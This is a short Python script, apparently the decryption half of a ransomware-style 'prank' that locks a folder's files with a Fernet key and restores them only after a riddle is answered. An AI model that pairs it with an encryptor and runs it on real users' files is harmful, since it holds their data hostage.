import os
from cryptography.fernet import Fernet

files=[]
for q in os.listdir():
    if q=="pennywise.py" or q=="thefear.key" or q=="decrypt.py":
        continue
    if os.path.isfile(q):
        files.append(q)
print(files)

with open("thefear.key","rb") as token:
    relic=token.read()

print("Answer the riddle to get your files back: What word is spelled incorrectly in every single dictionary?\n")
answer=input("Your answer: ")
if answer.lower()!="incorrectly":
    print("Wrong answer. Nice try Diddy.")

else:
    for balloon in files:
        with open(balloon,"rb") as theredone:
            contents=theredone.read()
        contents_decrypted=Fernet(relic).decrypt(contents)
        with open(balloon,"wb") as theredone:
           theredone.write(contents_decrypted)

    print("Correct answer. Your files have been decrypted. Enjoy the files and rate the prank mate!")